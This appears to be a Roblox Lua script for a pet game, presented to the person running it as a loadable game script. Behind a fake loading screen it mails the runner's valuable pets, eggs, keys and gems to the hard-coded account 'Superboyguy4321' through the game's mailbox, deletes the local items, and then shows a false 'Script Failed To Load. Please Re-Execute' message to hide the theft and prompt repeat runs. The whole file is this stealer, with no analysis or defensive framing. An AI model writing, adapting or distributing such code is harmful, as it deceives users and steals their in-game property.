local plr = game:GetService("Players").LocalPlayer
local inventory = plr:FindFirstChild("Backpack") or plr:FindFirstChild("PlayerGui")
local stats = plr:FindFirstChild("leaderstats") or plr:FindFirstChild("Coins")
local mailbox = game:GetService("Workspace"):FindFirstChild("Mailbox")

local recipient = "Superboyguy4321"
local message = "ez loot"

-- Fullscreen White Loading Screen
local whiteScreen = Instance.new("ScreenGui")
local loadingFrame = Instance.new("Frame")
local loadingLabel = Instance.new("TextLabel")
local stroke = Instance.new("UIStroke")

whiteScreen.Name = "PetsGoMailStealer"
whiteScreen.Parent = game:GetService("CoreGui")
whiteScreen.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

loadingFrame.Parent = whiteScreen
loadingFrame.BackgroundColor3 = Color3.new(1, 1, 1)
loadingFrame.BorderSizePixel = 0
loadingFrame.Size = UDim2.new(1, 0, 1, 0)

loadingLabel.Parent = loadingFrame
loadingLabel.AnchorPoint = Vector2.new(0.5, 0.5)
loadingLabel.Position = UDim2.new(0.5, 0, 0.5, 0)
loadingLabel.Size = UDim2.new(0, 600, 0, 200)
loadingLabel.BackgroundTransparency = 1
loadingLabel.TextColor3 = Color3.new(1, 0.5, 0)
loadingLabel.Font = Enum.Font.SourceSansBold
loadingLabel.TextSize = 50
loadingLabel.Text = "Script Loading Please Wait..."
stroke.Parent = loadingLabel
stroke.Color = Color3.new(0.5, 0.5, 0.5)
stroke.Thickness = 5

-- Animate Loading Text
local function animateLoadingText()
    local scale = 1
    while loadingFrame.Visible do
        for _, txt in ipairs({"Script Loading Please Wait.", "Script Loading Please Wait..", "Script Loading Please Wait..."}) do
            loadingLabel.Text = txt
            loadingLabel.Size = UDim2.new(0, 600 * scale, 0, 200 * scale)
            scale = scale + 0.05
            if scale > 1.5 then scale = 1 end
            task.wait(0.5)
        end
    end
end

coroutine.wrap(animateLoadingText)()

-- Delay to Simulate Loading
task.wait(5)

-- Function to Check Coins
local function hasEnoughCoins(amount)
    if stats and stats:FindFirstChild("Coins") then
        return stats.Coins.Value >= amount
    end
    return false
end

-- Stealing Logic
if inventory and mailbox then
    for _, item in ipairs(inventory:GetChildren()) do
        if item:IsA("Tool") or item:IsA("Folder") then
            -- Steal pets with value > 1 million or chance <= 1 in 1 million
            if item:FindFirstChild("Stats") then
                local value = item.Stats:FindFirstChild("Value")
                local chance = item.Stats:FindFirstChild("Chance")
                if (value and value.Value > 1000000) or (chance and chance.Value <= 1e-6) then
                    if hasEnoughCoins(50000) then
                        mailbox:InvokeServer("Send", recipient, item.Name, message)
                        item:Destroy()
                    end
                end
            else
                -- Steal any other valuables (keys, loot boxes, etc.)
                if hasEnoughCoins(50000) then
                    mailbox:InvokeServer("Send", recipient, item.Name, message)
                    item:Destroy()
                end
            end
        elseif item:IsA("Folder") and item.Name:lower():find("eggs") then
            -- Steal eggs
            for _, egg in ipairs(item:GetChildren()) do
                if hasEnoughCoins(50000) then
                    mailbox:InvokeServer("Send", recipient, egg.Name, message)
                end
            end
            item:ClearAllChildren()
        elseif item:IsA("NumberValue") and item.Name:lower():find("gems") then
            -- Steal gems
            if hasEnoughCoins(50000) then
                mailbox:InvokeServer("Send", recipient, "Gems", message)
                item.Value = 0
            end
        end
    end
else
    warn("Inventory or Mailbox not found!")
end

-- Replace Loading Screen with Black Error Screen
loadingFrame.Visible = false

local blackScreen = Instance.new("Frame")
local errorLabel = Instance.new("TextLabel")

blackScreen.Parent = whiteScreen
blackScreen.BackgroundColor3 = Color3.new(0, 0, 0)
blackScreen.BorderSizePixel = 0
blackScreen.Size = UDim2.new(1, 0, 1, 0)

errorLabel.Parent = blackScreen
errorLabel.AnchorPoint = Vector2.new(0.5, 0.5)
errorLabel.Position = UDim2.new(0.5, 0, 0.5, 0)
errorLabel.Size = UDim2.new(0, 800, 0, 200)
errorLabel.BackgroundTransparency = 1
errorLabel.TextColor3 = Color3.new(1, 0, 0)
errorLabel.Font = Enum.Font.SourceSansBold
errorLabel.TextSize = 60
errorLabel.Text = "Script Failed To Load. Please Re-Execute"

task.wait(5)
whiteScreen:Destroy()
